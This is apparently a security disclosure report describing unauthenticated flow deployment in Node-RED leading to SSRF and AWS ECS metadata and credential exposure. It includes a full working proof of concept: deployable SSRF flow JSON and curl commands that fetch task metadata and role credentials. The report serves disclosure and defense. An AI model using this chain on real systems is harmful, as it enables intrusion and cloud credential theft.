## Title: Unauthenticated Flow Deployment in Node-RED ≤ 5.0.9 Leads to Server-Side Request Forgery and Cloud Metadata Credential Exposure

**BUG_Author:** PRISMI Lab

**Affected Version:** Node-RED ≤ 5.0.9 (all released versions; `http request` is a built-in core node shipped with every release)

**Vendor:** [Node-RED (OpenJS Foundation)](https://github.com/node-red/node-red)


**Vulnerability Files:**
- `packages/node_modules/@node-red/editor-api/lib/auth/index.js`
- `packages/node_modules/@node-red/editor-api/lib/admin/flows.js`
- `packages/node_modules/@node-red/nodes/core/network/21-httprequest.js`

## Description:

1. **The flow deployment API is reachable without authentication (CWE-306):**
- `POST /flows` is guarded only by `needsPermission("flows.write")`. When `settings.js` has no `adminAuth` block — the default of the official `nodered/node-red` image — the middleware returns `next()` for every request and the deployment is applied to the running runtime immediately, with no restart:

```js
// @node-red/editor-api/lib/auth/index.js:61 (3.1.8) / :74 (5.0.9)
function needsPermission(permission) {
    return function(req,res,next) {
        if (settings && settings.adminAuth) {
            return passport.authenticate(['bearer','tokens','anon'],{ session: false })(req,res,function() {
                if (!req.user) { return next(); }
                if (permissions.hasPermission(req.authInfo.scope,permission)) { return next(); }
                return res.status(401).end();
            });
        } else {
            next();   // no adminAuth configured → anonymous deploy accepted
        }
    }
}
```

2. **The built-in `http request` node accepts its destination from the message at runtime, with no address policy:**
- The `url` configured in the node editor is only a default; if `msg.url` is present it wins. The node performs no destination validation of any kind:
- no IP/host allow-list or deny-list (`127.0.0.1`, RFC1918 and `169.254.0.0/16` are all reachable),
- no protocol restriction beyond `http`/`https`,
- no redirect re-validation (redirects can be disabled with `msg.followRedirects = false`),
- `msg.method`, `msg.headers` and `msg.payload` are equally overridable, so arbitrary methods and custom headers (e.g. cloud metadata headers) can be sent.
- A single deployed flow therefore behaves as a **generic, reusable SSRF proxy**: the attacker changes one query parameter instead of redeploying anything.

3. **The proxy is non-blind — the response body is returned to the attacker:**
- `http in` exposes the request object as `msg.req`, a `function` node maps `msg.req.query.u` into `msg.url`, and `http response` returns the fetched body and status code verbatim. The attacker reads the complete internal response, not just timing or error codes.
- This turns the application into a pivot into the container's network namespace and the surrounding VPC: internal REST APIs, admin panels, service-discovery names such as `*.compute.internal`, and cloud metadata services.

4. **Cloud task metadata is directly reachable from the container:**
- With the flow below deployed, `http://169.254.170.2/v2/metadata` (AWS ECS task metadata, the endpoint the AWS SDK itself uses to obtain task credentials) answers `200` and leaks, among others:

   | Field | Consequence |
   |---|---|
   | `TaskARN` | AWS account ID, region and cluster name; usable to correlate IAM and CloudTrail activity |
   | `Family` / `Revision` | Task definition template name — other instances of the same template are likely identically exposed |
   | `Containers[].Image` (with digest) | Exact image layers; enables environment reproduction and known-CVE mapping |
   | `Limits.Memory` | Container memory cap (explains OOM-based DoS) |
   | `AvailabilityZone` | Topology information for cross-AZ internal probing |

- `http://169.254.170.2/v2/stats` additionally discloses the full container ID, PID limits, block-IO counters and CPU time; `http://169.254.170.2/v3/<uuid>` discloses `DockerId`, `DockerName`, image and full container labels.

5. **The credential endpoint needs a second primitive — this limitation must be stated honestly:**
- Task-role credentials live at `http://169.254.170.2/v2/credentials/<UUID>`, where the UUID is a 128-bit random value taken from the container environment variable `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`. It cannot be enumerated or guessed.
- SSRF alone therefore yields the task profile, network statistics and container identity, but **not** credentials. When a second primitive is present in the same environment (file read of `/proc/self/environ`, or the command execution described in the companion report), the UUID becomes available and the chain closes:

```
① read /proc/self/environ            → AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/<uuid>
② SSRF GET http://169.254.170.2/v2/credentials/<uuid>
③ → { RoleArn, AccessKeyId: "ASIA…", SecretAccessKey, Token, Expiration }   (≈6 h lifetime)
```

- The result is a temporary role credential (`ASIA…`, with session token), usable for lateral movement inside the cloud account to the extent the role allows. The effective permission scope of the role was **not** verified during testing and is not asserted here.

6. **The hardening on the platform side is only half done:**
- `http://169.254.169.254/latest/meta-data/` (EC2 IMDS) fails with `EINVAL` — an iptables `REJECT` rule installed by the ECS agent, i.e. the instance role is protected.
- `169.254.170.2` is **not** blocked, because it is the platform's own credential channel that the SDK depends on. The result is a container that is protected against IMDS abuse but fully exposed to task-metadata abuse.

7. **Severity:** CVSS 3.1 `8.6` — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`. If the stolen temporary credentials are used, the practical impact reaches `I:H` (score up to 10.0 depending on the role policy). Preconditions: default configuration (no `adminAuth`) and a cloud environment that exposes a metadata service (ECS / EC2 / GCP / Azure all qualify).

8. **Why this is a separate finding from the RCE chains:**
- It uses a different built-in node (`http request` instead of `exec`), executes no system command, and survives the common industrial hardening "remove the `exec` and `function` nodes" — `http request` belongs to the network category and is usually kept because the business flows need it for data reporting and REST calls.
- Conversely, removing `http request` does not mitigate the `POST /nodes` → npm `postinstall` chain. The three paths share the same missing-authentication root cause but require different mitigations.
- Detection: unlike the `/nodes` chain, this one must write a flow, so `GET /flows` diffing does work here; the strongest network signal is egress to `169.254.0.0/16`, especially paths matching `/v2/credentials` or `/v2/metadata`. Note that Node-RED does not log `http in` access by default, and that link-local traffic never traverses an ENI, so VPC Flow Logs will not show it.

## Proof of Concept:

1. **Verify the precondition (read-only):**

```bash
# Anonymous read of /flows must return 200; 401/403 means adminAuth is configured and this chain does not apply
curl -s -o /dev/null -w "%{http_code}\n" "http://<target-ip>:1880/flows"
```

2. **Deploy the SSRF forwarding endpoint (no restart required, effective immediately):**

```bash
curl -s -X POST "http://<target-ip>:1880/flows" \
     -H "Content-Type: application/json" \
     -H "Node-RED-API-Version: v2" \
     --data-binary @flow_ssrf.json
```

- `flow_ssrf.json`:

```json
{"flows":[
 {"id":"ssrf_tab","type":"tab","label":"_ssrf","disabled":false,"info":""},
 {"id":"ssrf_in","type":"http in","z":"ssrf_tab","name":"","url":"/_ssrf",
  "method":"get","upload":false,"swaggerDoc":"","wires":[["ssrf_pre"]]},
 {"id":"ssrf_pre","type":"function","z":"ssrf_tab","name":"prep",
  "func":"msg.url = msg.req.query.u;\nmsg.method = 'GET';\nmsg.headers = {};\nmsg.followRedirects = false;\nmsg.timeout = 8000;\nreturn msg;",
  "outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],
  "wires":[["ssrf_req"]]},
 {"id":"ssrf_req","type":"http request","z":"ssrf_tab","name":"",
  "method":"GET","ret":"txt","paytoqs":"ignore","url":"","tls":"","persist":false,
  "proxy":"","insecureHTTPParser":false,"authType":"","senderr":false,"headers":[],
  "wires":[["ssrf_fmt"],["ssrf_err"]]},
 {"id":"ssrf_fmt","type":"function","z":"ssrf_tab","name":"fmt",
  "func":"const st = msg.statusCode || 0;\nlet b = msg.payload;\nif (typeof b !== 'string') { try { b = JSON.stringify(b); } catch(e) { b = String(b); } }\nmsg.payload = 'STATUS=' + st + '\\n' + b;\nmsg.statusCode = 200;\nmsg.headers = {'content-type':'text/plain; charset=utf-8'};\nreturn msg;",
  "outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],
  "wires":[["ssrf_out"]]},
 {"id":"ssrf_err","type":"function","z":"ssrf_tab","name":"err",
  "func":"let e = msg.error || {};\nmsg.payload = 'SSRF_ERROR: ' + (e.message || JSON.stringify(e));\nmsg.statusCode = 200;\nmsg.headers = {'content-type':'text/plain; charset=utf-8'};\nreturn msg;",
  "outputs":1,"timeout":0,"noerr":0,"initialize":"","finalize":"","libs":[],
  "wires":[["ssrf_out"]]},
 {"id":"ssrf_out","type":"http response","z":"ssrf_tab","name":"",
  "statusCode":"","headers":{},"wires":[]}
]}
```

- Four details are required for reliability: `ret: "txt"` (otherwise non-JSON bodies fail to parse), both outputs of `http request` wired (otherwise timeouts hang), `msg.timeout = 8000` (unreachable internal hosts otherwise block), and `followRedirects = false` (avoids recursion back into the proxy).

3. **Self-check — confirm the proxy works and is non-blind (loopback):**

```bash
curl -s --get --data-urlencode "u=http://127.0.0.1:1880/settings" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected (truncated):

```
STATUS=200
{"httpNodeRoot":"/","version":"5.0.9","context":{"default":"memory"},...}
```

4. **Read container statistics from the ECS task metadata service:**

```bash
curl -s --get --data-urlencode "u=http://169.254.170.2/v2/stats" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected: `STATUS=200` with the full container ID, `pids_stats`, `blkio_stats` and `cpu_stats`.

5. **Read the task profile:**

```bash
curl -s --get --data-urlencode "u=http://169.254.170.2/v2/metadata" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected (truncated, values masked):

```
STATUS=200
{"Cluster":"ecs-cluster",
 "TaskARN":"arn:aws:ecs:<region>:<account-id>:task/ecs-cluster/<task-id>",
 "Family":"l2-http_nodered_nodered_3_1_8","Revision":"3",
 "DesiredStatus":"RUNNING","KnownStatus":"RUNNING",
 "AvailabilityZone":"<region>b",
 "Limits":{"Memory":256},
 "Containers":[
   {"Name":"config-init","Image":"<registry>/l2container-config-init:2.0@sha256:<digest>"},
   {"Name":"node-red","Image":"<registry>/l2container-node-red:3.1.8@sha256:<digest>"},
   {"Name":"~internal~ecs~pause","Image":"amazon/amazon-ecs-pause:0.1.0"}]}
```

6. **Read container-level metadata (`v3`, UUID taken from `ECS_CONTAINER_METADATA_URI`):**

```bash
curl -s --get --data-urlencode "u=http://169.254.170.2/v3/<uuid>" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected: `DockerId`, `DockerName`, `Image` and the full `Labels` map, including `com.amazonaws.ecs.task-arn`.

7. **Control test — the EC2 instance metadata endpoint is blocked:**

```bash
curl -s --get --data-urlencode "u=http://169.254.169.254/latest/meta-data/" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected:

```
STATUS=EINVAL
RequestError: connect EINVAL 169.254.169.254:80 - Local (0.0.0.0:0)
```

- `EINVAL` rather than `ECONNREFUSED`/`ETIMEDOUT` proves an iptables `REJECT` rule, i.e. the platform blocks IMDS but not the ECS task metadata endpoint.

8. **Credential chain (conditional — requires a file-read or command-execution primitive in the same container):**

```bash
# (a) obtain the relative URI from the process environment (NOT part of the SSRF itself)
#     AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/<uuid>
#     ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/<uuid>

# (b) fetch the task-role credentials through the SSRF endpoint
curl -s --get --data-urlencode "u=http://169.254.170.2/v2/credentials/<uuid>" \
     "http://<target-ip>:1880/_ssrf"
```

- Expected (values masked):

```json
{"RoleArn":"arn:aws:iam::<account-id>:role/<task-role>",
 "AccessKeyId":"ASIA…",
 "SecretAccessKey":"…",
 "Token":"…",
 "Expiration":"2026-11-04T15:42:52Z"}
```

- The credentials are temporary (about 6 hours). No cloud API call was made with them during testing, so the effective permission scope of the role remains unverified.

9. **Restore the target (single step — this chain leaves no file artifacts):**

```bash
# overwrite the whole flow set with the original export
curl -s -X POST "http://<target-ip>:1880/flows" \
     -H "Content-Type: application/json" -H "Node-RED-API-Version: v2" \
     --data-binary @restore.json
```

- Post-restore verification: `/flows` back to the original node count, `/_ssrf` returns `404`, no user modules installed. Unlike the `POST /nodes` chain, nothing is written to `<userDir>/nodes` or `<userDir>/node_modules`, so no file cleanup is needed.

10. **Remediation reference:**
- Enable `adminAuth` (the only measure that removes the SSRF, RCE and settings-write paths at once).
- Apply least privilege to the task role, with `aws:SourceAccount` / `aws:SourceArn` conditions.
- Restrict egress from the container to the documented endpoints only; block `169.254.0.0/16` where the platform allows it (note that `169.254.170.2` is required by the ECS credential provider and cannot be blanket-blocked).
- Remove `http request` / `exec` / `function` from the palette if the business does not need them — this weakens but does not eliminate the exposure, since the `POST /nodes` chain can install them back.
- Detection: alert on egress to `169.254.0.0/16` (especially `/v2/credentials`, `/v2/metadata`), on new `<userDir>/node_modules` directories, and on `uptime`/`instanceId` resets in `/diagnostics`.
